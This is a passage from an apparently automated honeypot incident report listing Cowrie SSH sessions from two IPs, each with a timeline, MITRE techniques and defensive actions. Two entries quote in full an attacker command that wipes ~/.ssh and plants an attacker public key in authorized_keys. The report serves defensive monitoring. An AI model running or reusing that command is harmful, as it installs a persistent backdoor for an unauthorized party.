| `2026-06-14 22:30:30` | `cowrie.command.failed` |
| `2026-06-14 22:30:30` | `cowrie.log.closed` |
| `2026-06-14 22:30:31` | `cowrie.session.params` |
| `2026-06-14 22:30:31` | `cowrie.command.input` |
| `2026-06-14 22:30:31` | `cowrie.session.file_download` |
| `2026-06-14 22:30:31` | `cowrie.log.closed` |
| `2026-06-14 22:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ce3af129917

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:30 |
| **Last Seen** | 2026-06-14 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:30:34` | `cowrie.session.connect` |
| `2026-06-14 22:30:34` | `cowrie.client.version` |
| `2026-06-14 22:30:34` | `cowrie.client.kex` |
| `2026-06-14 22:30:35` | `cowrie.login.success` |
| `2026-06-14 22:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b890fd86ee2

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:32 |
| **Last Seen** | 2026-06-14 22:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:32:28` | `cowrie.session.connect` |
| `2026-06-14 22:32:28` | `cowrie.client.version` |
| `2026-06-14 22:32:28` | `cowrie.client.kex` |
| `2026-06-14 22:32:29` | `cowrie.login.success` |
| `2026-06-14 22:32:29` | `cowrie.session.params` |
| `2026-06-14 22:32:29` | `cowrie.command.input` |
| `2026-06-14 22:32:29` | `cowrie.command.failed` |
| `2026-06-14 22:32:30` | `cowrie.log.closed` |
| `2026-06-14 22:32:30` | `cowrie.session.params` |
| `2026-06-14 22:32:30` | `cowrie.command.input` |
| `2026-06-14 22:32:30` | `cowrie.session.file_download` |
| `2026-06-14 22:32:30` | `cowrie.log.closed` |
| `2026-06-14 22:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba87b95e15e

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:32 |
| **Last Seen** | 2026-06-14 22:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:32:33` | `cowrie.session.connect` |
| `2026-06-14 22:32:33` | `cowrie.client.version` |
| `2026-06-14 22:32:33` | `cowrie.client.kex` |
| `2026-06-14 22:32:34` | `cowrie.login.success` |
| `2026-06-14 22:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ffa9aa69871

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:31` | `cowrie.session.connect` |
| `2026-06-14 22:37:31` | `cowrie.client.version` |
| `2026-06-14 22:37:32` | `cowrie.client.kex` |
| `2026-06-14 22:37:32` | `cowrie.login.success` |
| `2026-06-14 22:37:32` | `cowrie.session.params` |
| `2026-06-14 22:37:32` | `cowrie.command.input` |
| `2026-06-14 22:37:32` | `cowrie.log.closed` |
| `2026-06-14 22:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a50ad9653c52

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:39` | `cowrie.session.connect` |
| `2026-06-14 22:37:39` | `cowrie.client.version` |
| `2026-06-14 22:37:39` | `cowrie.client.kex` |
| `2026-06-14 22:37:39` | `cowrie.login.success` |
| `2026-06-14 22:37:40` | `cowrie.session.params` |
| `2026-06-14 22:37:40` | `cowrie.command.input` |
| `2026-06-14 22:37:40` | `cowrie.log.closed` |
| `2026-06-14 22:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3167ac17e423

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:40` | `cowrie.session.connect` |
| `2026-06-14 22:37:40` | `cowrie.client.version` |
| `2026-06-14 22:37:40` | `cowrie.client.kex` |
| `2026-06-14 22:37:40` | `cowrie.login.success` |
| `2026-06-14 22:37:41` | `cowrie.session.params` |
| `2026-06-14 22:37:41` | `cowrie.command.input` |
| `2026-06-14 22:37:41` | `cowrie.log.closed` |
| `2026-06-14 22:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb65b4e9b7c

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:50` | `cowrie.session.connect` |
| `2026-06-14 22:37:50` | `cowrie.client.version` |
| `2026-06-14 22:37:50` | `cowrie.client.kex` |
| `2026-06-14 22:37:51` | `cowrie.login.success` |
| `2026-06-14 22:37:51` | `cowrie.session.params` |
| `2026-06-14 22:37:51` | `cowrie.command.input` |
| `2026-06-14 22:37:51` | `cowrie.log.closed` |
| `2026-06-14 22:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ca47c838ed

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:51` | `cowrie.session.connect` |
| `2026-06-14 22:37:51` | `cowrie.client.version` |
| `2026-06-14 22:37:51` | `cowrie.client.kex` |
| `2026-06-14 22:37:52` | `cowrie.login.success` |
| `2026-06-14 22:37:52` | `cowrie.session.params` |
| `2026-06-14 22:37:52` | `cowrie.command.input` |
| `2026-06-14 22:37:52` | `cowrie.log.closed` |
| `2026-06-14 22:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-605c2241b767

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:52` | `cowrie.session.connect` |
| `2026-06-14 22:37:52` | `cowrie.client.version` |
| `2026-06-14 22:37:52` | `cowrie.client.kex` |
| `2026-06-14 22:37:52` | `cowrie.login.success` |
| `2026-06-14 22:37:53` | `cowrie.session.params` |
| `2026-06-14 22:37:53` | `cowrie.command.input` |
| `2026-06-14 22:37:53` | `cowrie.log.closed` |
| `2026-06-14 22:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-045256794e64

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:53` | `cowrie.session.connect` |
| `2026-06-14 22:37:53` | `cowrie.client.version` |
| `2026-06-14 22:37:53` | `cowrie.client.kex` |
| `2026-06-14 22:37:54` | `cowrie.login.success` |
| `2026-06-14 22:37:54` | `cowrie.session.params` |
| `2026-06-14 22:37:54` | `cowrie.command.input` |
| `2026-06-14 22:37:54` | `cowrie.log.closed` |
| `2026-06-14 22:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3797a61dc03

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:37 |
| **Last Seen** | 2026-06-14 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:37:54` | `cowrie.session.connect` |
| `2026-06-14 22:37:54` | `cowrie.client.version` |
| `2026-06-14 22:37:54` | `cowrie.client.kex` |
| `2026-06-14 22:37:54` | `cowrie.login.success` |
| `2026-06-14 22:37:55` | `cowrie.session.params` |
| `2026-06-14 22:37:55` | `cowrie.command.input` |
| `2026-06-14 22:37:55` | `cowrie.log.closed` |
| `2026-06-14 22:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902e61a0cb4d

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:09` | `cowrie.session.connect` |
| `2026-06-14 22:38:09` | `cowrie.client.version` |
| `2026-06-14 22:38:09` | `cowrie.client.kex` |
| `2026-06-14 22:38:09` | `cowrie.login.success` |
| `2026-06-14 22:38:10` | `cowrie.session.params` |
| `2026-06-14 22:38:10` | `cowrie.command.input` |
| `2026-06-14 22:38:10` | `cowrie.log.closed` |
| `2026-06-14 22:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a088db55e72

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:16` | `cowrie.session.connect` |
| `2026-06-14 22:38:16` | `cowrie.client.version` |
| `2026-06-14 22:38:16` | `cowrie.client.kex` |
| `2026-06-14 22:38:16` | `cowrie.login.success` |
| `2026-06-14 22:38:16` | `cowrie.session.params` |
| `2026-06-14 22:38:16` | `cowrie.command.input` |
| `2026-06-14 22:38:17` | `cowrie.log.closed` |
| `2026-06-14 22:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1dd892ed2bd

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:17` | `cowrie.session.connect` |
| `2026-06-14 22:38:17` | `cowrie.client.version` |
| `2026-06-14 22:38:17` | `cowrie.client.kex` |
| `2026-06-14 22:38:17` | `cowrie.login.success` |
| `2026-06-14 22:38:18` | `cowrie.session.params` |
| `2026-06-14 22:38:18` | `cowrie.command.input` |
| `2026-06-14 22:38:18` | `cowrie.log.closed` |
| `2026-06-14 22:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a43ff6d7781

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:17` | `cowrie.session.connect` |
| `2026-06-14 22:38:17` | `cowrie.client.version` |
| `2026-06-14 22:38:18` | `cowrie.client.kex` |
| `2026-06-14 22:38:18` | `cowrie.login.success` |
| `2026-06-14 22:38:18` | `cowrie.session.params` |
| `2026-06-14 22:38:18` | `cowrie.command.input` |
| `2026-06-14 22:38:19` | `cowrie.log.closed` |
| `2026-06-14 22:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8c77c10e96

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:18` | `cowrie.session.connect` |
| `2026-06-14 22:38:18` | `cowrie.client.version` |
| `2026-06-14 22:38:19` | `cowrie.client.kex` |
| `2026-06-14 22:38:19` | `cowrie.login.success` |
| `2026-06-14 22:38:19` | `cowrie.session.params` |
| `2026-06-14 22:38:19` | `cowrie.command.input` |
| `2026-06-14 22:38:19` | `cowrie.log.closed` |
| `2026-06-14 22:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1afb4a54d43

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:19` | `cowrie.session.connect` |
| `2026-06-14 22:38:19` | `cowrie.client.version` |
| `2026-06-14 22:38:19` | `cowrie.client.kex` |
| `2026-06-14 22:38:20` | `cowrie.login.success` |
| `2026-06-14 22:38:20` | `cowrie.session.params` |
| `2026-06-14 22:38:20` | `cowrie.command.input` |
| `2026-06-14 22:38:20` | `cowrie.log.closed` |
| `2026-06-14 22:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4552e0c41b

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:23` | `cowrie.session.connect` |
| `2026-06-14 22:38:23` | `cowrie.client.version` |
| `2026-06-14 22:38:23` | `cowrie.client.kex` |
| `2026-06-14 22:38:24` | `cowrie.login.success` |
| `2026-06-14 22:38:24` | `cowrie.session.params` |
| `2026-06-14 22:38:24` | `cowrie.command.input` |
| `2026-06-14 22:38:24` | `cowrie.command.failed` |
| `2026-06-14 22:38:25` | `cowrie.log.closed` |
| `2026-06-14 22:38:25` | `cowrie.session.params` |
| `2026-06-14 22:38:25` | `cowrie.command.input` |
| `2026-06-14 22:38:25` | `cowrie.session.file_download` |
| `2026-06-14 22:38:25` | `cowrie.log.closed` |
| `2026-06-14 22:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9418c02970be

| Field | Detail |
|---|---|
| **Source IP** | `4.227.177[.]11` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:28` | `cowrie.session.connect` |
| `2026-06-14 22:38:28` | `cowrie.client.version` |
| `2026-06-14 22:38:28` | `cowrie.client.kex` |
| `2026-06-14 22:38:29` | `cowrie.login.success` |
| `2026-06-14 22:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.227.177[.]11` to AbuseIPDB if not already reported
- [ ] Block `4.227.177[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c86d490bcde

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:29` | `cowrie.session.connect` |
| `2026-06-14 22:38:29` | `cowrie.client.version` |
| `2026-06-14 22:38:29` | `cowrie.client.kex` |
| `2026-06-14 22:38:29` | `cowrie.login.success` |
| `2026-06-14 22:38:30` | `cowrie.session.params` |
| `2026-06-14 22:38:30` | `cowrie.command.input` |
| `2026-06-14 22:38:30` | `cowrie.log.closed` |
| `2026-06-14 22:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5220c9c6baa6

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:37` | `cowrie.session.connect` |
| `2026-06-14 22:38:37` | `cowrie.client.version` |
| `2026-06-14 22:38:38` | `cowrie.client.kex` |
| `2026-06-14 22:38:38` | `cowrie.login.success` |
| `2026-06-14 22:38:38` | `cowrie.session.params` |
| `2026-06-14 22:38:38` | `cowrie.command.input` |
| `2026-06-14 22:38:39` | `cowrie.log.closed` |
| `2026-06-14 22:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9966bb450a63

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:38` | `cowrie.session.connect` |
| `2026-06-14 22:38:38` | `cowrie.client.version` |
| `2026-06-14 22:38:38` | `cowrie.client.kex` |
| `2026-06-14 22:38:39` | `cowrie.login.success` |
| `2026-06-14 22:38:39` | `cowrie.session.params` |
| `2026-06-14 22:38:39` | `cowrie.command.input` |
| `2026-06-14 22:38:39` | `cowrie.log.closed` |
| `2026-06-14 22:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f4e587d467

| Field | Detail |
|---|---|
| **Source IP** | `47.83.133[.]46` |
| **First Seen** | 2026-06-14 22:38 |
| **Last Seen** | 2026-06-14 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 22:38:39` | `cowrie.session.connect` |
| `2026-06-14 22:38:39` | `cowrie.client.version` |
| `2026-06-14 22:38:39` | `cowrie.client.kex` |
| `2026-06-14 22:38:39` | `cowrie.login.success` |
| `2026-06-14 22:38:40` | `cowrie.session.params` |
| `2026-06-14 22:38:40` | `cowrie.command.input` |
| `2026-06-14 22:38:40` | `cowrie.log.closed` |
| `2026-06-14 22:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.83.133[.]46` to AbuseIPDB if not already reported
- [ ] Block `47.83.133[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0140f6aa889

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-06-14 23:04 |
| **Last Seen** | 2026-06-14 23:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
